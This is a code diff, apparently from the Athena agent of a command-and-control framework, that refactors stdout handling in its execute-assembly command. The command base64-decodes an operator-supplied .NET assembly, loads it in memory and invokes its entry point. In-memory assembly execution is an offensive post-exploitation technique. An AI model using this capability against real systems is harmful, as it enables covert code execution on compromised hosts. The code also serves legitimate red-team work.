@@ -118,32 +118,23 @@ namespace Athena.Commands
 
             ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);
 
-            //Add an alert for when the assembly is finished executing
+            if (!PluginHandler.CaptureStdOut(job.task.id))
+            {
+                return new ResponseResult()
+                {
+                    completed = true,
+                    user_output = "Couldn't get a handle on Std.Out!",
+                    task_id = job.task.id,
+                }.ToJson();
+            }
+
             try
             {
-                StringWriter sw = new StringWriter();
-
-                if (!PluginHandler.CaptureStdOut(job.task.id))
-                {
-                    return new ResponseResult()
-                    {
-                        completed = true,
-                        user_output = "Couldn't get a handle on Std.Out!",
-                        task_id = job.task.id,
-                    }.ToJson();
-                }
-                
                 //Load the assembly
                 var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));
 
                 //Invoke the Assembly
                 assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
-                    
-                //Return StdOut back to original location
-                PluginHandler.ReleaseStdOut();
-
-                return await this.GetAssemblyOutput();
-
             }
             catch (Exception e)
             {
@@ -156,6 +147,9 @@ namespace Athena.Commands
                     status = "error"
                 }.ToJson();
             }
+
+            PluginHandler.ReleaseStdOut();
+            return await this.GetAssemblyOutput();
         }
         /// <summary>
         /// Get output from the currently running assembly
@@ -222,6 +216,7 @@ namespace Athena.Commands
                     {
                         IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                         this.loadedPlugins.GetOrAdd(plug.Name, plug);
+
                         return new LoadCommandResponseResult()
                         {
                             completed = true,
